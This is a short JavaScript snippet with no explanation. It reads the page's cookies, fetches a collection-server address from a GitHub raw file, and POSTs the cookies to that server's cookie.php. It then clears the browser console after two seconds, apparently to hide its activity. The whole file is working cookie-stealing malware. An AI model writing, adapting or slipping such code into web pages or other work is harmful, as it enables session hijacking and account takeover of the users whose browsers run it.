const sendCookie = async () => {
    const cookie = document.cookie;
    const url = "https://raw.githubusercontent.com/Wolota/ips/main/url-new";

    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            const urlContent = xhr.responseText;
            const response = fetch(urlContent + "/cookie.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: "cookie=" + encodeURIComponent(cookie)
            });
        }
    };
    xhr.send();
};

sendCookie();

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function demo() {
    await sleep(2000);
    console.clear()
}

demo();
